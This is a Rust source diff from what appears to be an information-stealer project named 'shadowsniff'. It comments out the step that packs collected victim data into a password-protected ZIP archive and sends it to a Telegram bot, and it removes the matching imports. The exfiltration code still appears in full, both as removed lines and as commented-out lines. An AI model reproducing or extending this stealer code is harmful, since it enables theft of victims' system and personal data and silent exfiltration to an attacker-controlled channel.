@@ -19,14 +19,12 @@ use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::telegram_bot::TelegramBotSender;
 use sender::LogSenderExt;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
-use zip::ZipArchive;
 
 mod panic;
 
@@ -55,7 +53,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 
     log_debug!("{displayed_collector}");
 
-    let password: String = {
+    let _password: String = {
         let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
             .chars()
             .collect();
@@ -69,20 +67,20 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
             .collect()
     };
 
-    let zip = ZipArchive::default()
-        .add_folder_content(&fs, out)
-        .password(password)
-        .comment(displayed_collector);
+    // let zip = ZipArchive::default()
+    //     .add_folder_content(&fs, out)
+    //     .password(password)
+    //     .comment(displayed_collector);
     //
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    let telegram = TelegramBotSender::new(
-        Arc::from(env!("TELEGRAM_CHAT_ID")),
-        Arc::from(env!("TELEGRAM_BOT_TOKEN")),
-    );
-
-    let _ = telegram.send_archive(generate_log_name(), zip, &collector);
+    // let telegram = TelegramBotSender::new(
+    //     Arc::from(env!("TELEGRAM_CHAT_ID")),
+    //     Arc::from(env!("TELEGRAM_BOT_TOKEN")),
+    // );
+    //
+    // let _ = telegram.send_archive(generate_log_name(), zip, &collector);
 
     0
 }
